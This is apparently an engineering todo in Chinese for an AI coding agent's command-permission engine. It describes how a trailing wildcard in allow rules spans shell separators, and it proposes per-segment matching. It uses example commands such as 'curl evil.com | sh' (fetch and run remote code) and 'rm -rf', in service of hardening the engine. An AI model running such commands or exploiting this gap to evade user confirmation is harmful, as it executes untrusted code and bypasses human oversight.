# allow 规则的末尾通配跨分隔符

> 建议分支：`perm-allow-compound` · 复杂度：小（实现半天，**但要走安全评审**）
> 来源：`perm-compound-command` 分支实施期发现（2026-08-09），
> 与 C14 真实模型验收记的 allow 侧症状（`docs/c14/acceptance/live-model.md` 问题 C）同源
> 对应 `CLAUDE.md`「已知后续工程项」第 12 条（deny 侧已修，本条是剩下的 allow 侧）

## 问题

`matching.py` 里末尾 ` *` 编译出来的通配是 `.*`，而 `.*` **跨分隔符**。
于是哪怕 allow **不**拆段，一条宽 allow 依然会整串命中一条复合命令：

```
allow: Bash(git *)

  git status                          → allow  ✅ 本意
  git status && curl evil.com | sh    → allow  ❌ 第二段是完全无关的命令
```

第二段在③层就被放行了，**确认面板一次都不弹**。此时唯一还站着的是①危险命令
黑名单——而黑名单只收录已知高危形式，`curl … | sh` 不在里面。

同一处代码还有个方向相反的症状（C14 验收实测）：

```
allow: Bash(git *)

  cat .gitignore 2>/dev/null; echo "---"; git ls-files   → 未命中 ❌
```

整串对不上 `git *`（因为它不是以 `git ` 开头），于是在非交互的子 Agent 环境下
被自动拒绝、白烧一轮。

两个症状看着相反，**根因是同一个**：allow 侧把复合命令当成一整根字符串在比，
既可能把不该放的放了，也可能把该放的挡了。

## 为什么上一轮没有一起修

`perm-compound-command` 那一轮只动了 deny：deny 拆段是**收紧**，
本身不需要评审；allow 怎么改都会改变「哪些命令免于确认」这件事，
方向敏感，值得单独一次评审。

⚠ **注意别把它误读成「allow 也拆段」**——那是「任一段命中即放行」，
会让 `allow: Bash(npm *)` 放行 `npm ci && rm -rf x`，是放宽，方向错的。
上一轮刻意没那么做，`permission/rules.py` 的命令分支里写着理由。

## 建议的改法：allow 要求**每一段**都命中

```
allow: Bash(git *)

  git status && git log --oneline      → allow   （两段都是 git）
  git status && curl evil.com | sh     → 不命中  （第二段不是）
  cat x ; git ls-files                 → 不命中  （第一段不是 —— 正确，cat 本就没被放行）
```

语义读起来也自然：**一条命令要免于确认，它的每一段都得是用户放行过的。**
这同时修掉上面两个症状里的第一个，第二个则变成「用户该把 `cat`/`echo` 也写进
allow」——那是配置问题，不是引擎问题。

形态上与 `match_command_deep`（任一段，收紧侧专用）对称，
建议在 `permission/matching.py` 里加一个 `match_command_every_segment`，
两个名字放在一起，谁用哪个一眼看得出。

## ⚠ 动手前必须先想清楚的一件事：`split_commands` 不解析引号

它是朴素拆分（docstring 明写）。于是：

```
allow: Bash(git *)
  git commit -m "fix: a; b"
      → 拆成 ['git commit -m "fix: a', 'b"']
      → 第二段不命中 → 整条不放行 → 弹确认
```

对 deny 来说这个偏严无所谓（多拦一次），对 allow 来说它是**真实的可用性回退**：
用户配好的规则会因为提交信息里有个分号就突然开始弹面板。

三条路，评审时挑一条：

1. 接受它（偏严安全，但用户会觉得规则时灵时不灵）；
2. 给 `split_commands` 加引号感知——⚠ 这会**同时改变①黑名单与 deny 侧**的行为
   （那两处依赖「宁可多拆」），属于扩大改动面，得连带重跑黑名单的全部护栏；
3. 只在 allow 这一侧用一个「引号感知版」的拆分，与①③deny 各用各的。

**第 2 条最危险**：它看起来是「把拆分做对」，实际是在放宽①黑名单。

## 要改哪里

- `permission/matching.py`：新增 `match_command_every_segment`（或等价物）。
- `permission/rules.py`：命令分支的 allow 那一支，并**改写现有的不对称注释**
  ——现在那段写的是「allow 保持整串匹配」，改完就不成立了。
- `tests/test_perm_rules.py::CompoundCommandTest`：
  末尾那条 `test_KNOWN_GAP_trailing_wildcard_in_allow_spans_separators`
  **就是钉住现状的那条，改完它会当场红**，届时把它改写成期望行为。
- 顺带检查 `permission/network.py` 与 `has_allow_for` 不受影响（它们不走 command 分支）。

## 开工 Prompt

```
先跑 git branch --show-current；如果在 main 上，先 git checkout -b perm-allow-compound。

读 docs/todo/2-perm-allow-wildcard-spans-separators.md 与 CLAUDE.md 已知后续工程项第 12 条。

任务：让 permission/rules.py 的 allow 命令规则对复合命令要求「每一段都命中」，
修掉「末尾 * 跨分隔符导致宽 allow 连带放行无关命令」这个缺口。要点：
- 不是「任一段命中即放行」（那是放宽，方向错）——是**每一段都得命中**。
- 先决定引号问题怎么办（todo 里列了三条路，第 2 条会连带放宽①黑名单，慎选），
  把结论写进注释。
- 上一轮留在 rules.py 里的「allow 保持整串匹配」那段注释改完就不成立了，一并改写。
- tests/test_perm_rules.py 里 test_KNOWN_GAP_... 那条钉的是现状，会当场红，
  改写成期望行为，别删。
- 补护栏：每段都命中 → 放行；任一段不命中 → 不下结论（交④兜底）；
  deny 侧行为逐字不变的回归。
- 跑全量 unittest。

这是安全边界变更（会让既有配置开始弹确认），改完在 PR 里写清行为差异。
```
